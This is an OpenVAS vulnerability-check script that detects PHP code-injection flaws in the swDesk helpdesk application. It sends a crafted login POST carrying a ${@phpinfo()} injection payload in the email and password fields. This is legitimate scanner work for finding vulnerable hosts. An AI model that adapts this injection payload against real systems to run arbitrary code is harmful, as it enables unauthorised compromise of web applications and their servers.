###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_swdesk_51792.nasl 12 2013-10-27 11:15:33Z jan $
#
# swDesk Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "swDesk is prone to the following vulnerabilities:

1. An arbitrary file-upload vulnerability.
2. Multiple cross-site scripting vulnerabilities.
3. Multiple PHP code-injection vulnerabilities.

An attacker can exploit these issues to execute arbitrary script code
in the context of the affected site, steal cookie-based authentication
credentials, upload arbitrary code, or inject and execute arbitrary
code in the context of the affected application. This may facilitate a
compromise of the application and the underlying system; other attacks
are also possible.";


if (description)
{
 script_id(103425);
 script_bugtraq_id(51792);
 script_version ("$Revision: 12 $");

 script_name("swDesk Multiple Input Validation Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51792");
 script_xref(name : "URL" , value : "http://www.swdesk.com/");

 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-02-16 13:08:33 +0100 (Thu, 16 Feb 2012)");
 script_description(desc);
 script_summary("Determine if installed swDesk is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/helpdesk","/swdesk","/swhelpdesk/",cgi_dirs());
host = get_host_name();

foreach dir (dirs) {
   
  url = string(dir, "/signin.php"); 

  if(http_vuln_check(port:port, url:url,pattern:"Powered by swDesk")) {

    req = string("POST ",dir," /signin.php HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "Referer: http://",host,url,"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: 74\r\n",
                 "\r\n",
                 "email=phpi%24%7B%40phpinfo%28%29%7D&password=phpi%24%7B%40phpinfo%28%29%7D\r\n");

    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if("<title>phpinfo()" >< result) {
      security_hole(port:port);
      exit(0);
    }  

  }
}

exit(0);
